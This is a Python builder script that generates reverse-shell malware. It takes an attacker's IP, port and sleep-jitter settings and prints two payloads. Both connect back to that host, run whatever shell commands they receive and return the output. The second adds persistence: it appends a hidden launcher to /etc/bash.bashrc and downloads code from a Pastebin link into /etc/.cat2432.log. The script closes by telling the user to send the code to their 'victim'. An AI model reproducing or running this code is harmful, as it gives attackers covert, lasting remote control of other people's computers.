import os 
import time
ip = input("IP: ")
port = input("PORT: ")
time1 = input("Time to sleep before trying to connect: ")
time1random = input("Random max for time before try to reconect (must be more than 1): ")
time2 = input("Time to sleep before accepting command and returning output: ")
time2random = input("Random max for time before accepting and responding to a command (must be more than 1): ")
print("Building payload 1... ")
time.sleep(1)
os.system("clear")
bob = """
import socket
import base64
import os
import subprocess
import sys
import time
import random
SERVER_HOST = '""" + ip + """'
SERVER_PORT = """ + port + """
BUFFER_SIZE = 1024 * 128 
SEPARATOR = ""
# create the socket object

# connect to the server
while True:
    s = socket.socket()
    time.sleep(""" + time1 + """)
    time.sleep(int(random.randint(1,""" + time1random + """)))
    try:
        s.connect((SERVER_HOST, SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())
        while True:
            time.sleep(""" + time2 +""")
            time.sleep(int(random.randint(1,""" + time2random + """)))
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if command == "NULL":
                os.system("python3 " +filepath2)
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}"
            s.send(message.encode())
        # close client connection
        s.close()
    except Exception:
        ()

"""
print(bob)
time.sleep(5)
print("\n")
print("copy and paste the above code into a raw paste (in pastebin)")
paste = input("Raw Pastebin link: ")
print("Building payload 2...")
time.sleep(1)
os.system("clear")
print("""
import socket
import base64
import os
import subprocess
import sys
import time
import random
os.system('echo "\\n nohup python3 /etc/.cat2432.log &" >>  /etc/bash.bashrc')
pastebin = '""" + paste + """'
filepath2 = os.path.basename(__file__)
SERVER_HOST = '""" + ip + """'
SERVER_PORT = """ + port + """
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
os.system("curl " + pastebin + " > /etc/.cat2432.log")
SEPARATOR = " "
# create the socket object

# connect to the server
while True:
    s = socket.socket()
    time.sleep(""" + time1 + """)
    time.sleep(int(random.randint(1,""" + time1random + """)))
    try:
        s.connect((SERVER_HOST, SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())
        while True:
            time.sleep(""" + time2 + """)
            time.sleep(int(random.randint(1,""" + time2random + """)))
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if command == "NULL":
                os.system("python3 " +filepath2)
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}"
            s.send(message.encode())
        # close client connection
        s.close()
    except Exception:
        ()
""")
print("\n\n\n\n")
print("Send the above code to your victim and have a nice day...")
